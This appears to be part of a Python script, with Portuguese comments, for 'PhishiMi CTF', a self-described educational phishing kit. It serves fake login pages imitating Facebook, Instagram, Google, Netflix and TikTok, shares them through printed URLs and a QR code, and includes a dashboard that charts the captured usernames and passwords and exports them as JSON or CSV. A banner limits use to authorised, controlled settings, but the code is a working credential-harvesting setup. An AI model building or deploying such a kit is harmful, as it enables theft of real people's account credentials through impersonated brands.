    const ctx = document.getElementById('template-chart');
    if (!ctx) return;
    
    const labels = Object.keys(templateData);
    const data = Object.values(templateData);
    
    // Criar ou atualizar gráfico
    if (window.templateChart) {
        window.templateChart.data.labels = labels;
        window.templateChart.data.datasets[0].data = data;
        window.templateChart.update();
    } else {
        window.templateChart = new Chart(ctx, {
            type: 'pie',
            data: {
                labels: labels,
                datasets: [{
                    data: data,
                    backgroundColor: [
                        '#1877f2', // Facebook
                        '#e4405f', // Instagram
                        '#4285f4', // Google
                        '#e50914', // Netflix
                        '#000000'  // TikTok
                    ]
                }]
            },
            options: {
                responsive: true,
                plugins: {
                    legend: {
                        position: 'bottom'
                    }
                }
            }
        });
    }
}

// Exportar dados
function exportData(format = 'json') {
    fetch('/api/captures')
        .then(response => response.json())
        .then(data => {
            let content, mimeType, filename;
            
            if (format === 'json') {
                content = JSON.stringify(data, null, 2);
                mimeType = 'application/json';
                filename = 'capturas.json';
            } else if (format === 'csv') {
                content = convertToCSV(data);
                mimeType = 'text/csv';
                filename = 'capturas.csv';
            }
            
            const blob = new Blob([content], { type: mimeType });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            showNotification('Dados exportados com sucesso!');
        })
        .catch(error => {
            console.error('Erro ao exportar dados:', error);
            showNotification('Erro ao exportar dados', 'error');
        });
}

// Converter para CSV
function convertToCSV(data) {
    if (data.length === 0) return '';
    
    const headers = Object.keys(data[0]);
    const rows = data.map(row => 
        headers.map(header => 
            JSON.stringify(row[header], (key, value) => 
                value === null ? '' : value
            )
        ).join(',')
    );
    
    return [headers.join(','), ...rows].join('\\n');
}

// Simular nova captura (para testes)
function simulateCapture() {
    const templates = ['facebook', 'instagram', 'google', 'netflix', 'tiktok'];
    const template = templates[Math.floor(Math.random() * templates.length)];
    const username = 'usuario_' + Math.floor(Math.random() * 1000);
    const password = 'senha_' + Math.floor(Math.random() * 1000);
    
    fetch('/simulate', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            template: template,
            username: username,
            password: password
        })
    })
    .then(response => response.json())
    .then(data => {
        showNotification('Captura simulada adicionada!');
        updateStats();
    })
    .catch(error => {
        console.error('Erro ao simular captura:', error);
    });
}

// Inicializar
document.addEventListener('DOMContentLoaded', function() {
    // Atualizar estatísticas a cada 10 segundos
    setInterval(updateStats, 10000);
    
    // Inicializar gráficos
    if (typeof Chart !== 'undefined') {
        updateStats();
    }
    
    // Configurar botões
    document.querySelectorAll('.btn-export').forEach(btn => {
        btn.addEventListener('click', function() {
            const format = this.dataset.format || 'json';
            exportData(format);
        });
    });
    
    // Configurar botão de simulação (se existir)
    const simulateBtn = document.getElementById('simulate-capture');
    if (simulateBtn) {
        simulateBtn.addEventListener('click', simulateCapture);
    }
});'''
    
    with open("static/script.js", "w", encoding="utf-8") as f:
        f.write(js)

# ========== FUNÇÃO PRINCIPAL ==========
def main():
    """Função principal"""
    print("""
    ╔══════════════════════════════════════════╗
    ║          🎣 PhishiMi CTF v1.0           ║
    ║     Ferramenta Educacional de Phishing  ║
    ╚══════════════════════════════════════════╝
    
    [⚠️] USE APENAS EM AMBIENTE CONTROLADO
    [⚠️] COM AUTORIZAÇÃO EXPLÍCITA
    """)
    
    # Inicializar sistema
    init_database()
    create_templates()
    create_static_files()
    
    # Obter IP local
    local_ip = get_local_ip()
    
    print(f"\n[+] Inicializando servidor...")
    print(f"[+] IP Local: {local_ip}")
    print(f"[+] Porta: {PORT}")
    
    # Iniciar servidor
    server = ThreadedHTTPServer(('0.0.0.0', PORT), PhishingHandler)
    
    print(f"\n✅ Servidor iniciado com sucesso!")
    print(f"\n📱 URL Principal: http://{local_ip}:{PORT}")
    print(f"📊 Dashboard: http://{local_ip}:{PORT}/dashboard")
    print(f"🎯 QR Code: http://{local_ip}:{PORT}/qrcode")
    
    print(f"\n🎣 Templates disponíveis:")
    print(f"   http://{local_ip}:{PORT}/facebook")
    print(f"   http://{local_ip}:{PORT}/instagram")
    print(f"   http://{local_ip}:{PORT}/google")
    print(f"   http://{local_ip}:{PORT}/netflix")
    print(f"   http://{local_ip}:{PORT}/tiktok")
    
    print(f"\n📈 Monitoramento em tempo real:")
    print(f"   Dashboard atualiza automaticamente a cada 5 segundos")
    
    print(f"\n[📢] Capturas são salvas automaticamente no banco de dados")
    print("[📢] Dados de exemplo já incluídos para teste")
    print("[📢] Pressione CTRL+C para encerrar\n")
    
    try:
        # Abrir no navegador
        webbrowser.open(f"http://localhost:{PORT}")
        
        # Manter servidor rodando
        server.serve_forever()
        
    except KeyboardInterrupt:
        print("\n\n[!] Encerrando servidor...")
        server.shutdown()
        print("[+] Servidor encerrado. Até mais!")

if __name__ == "__main__":
    main()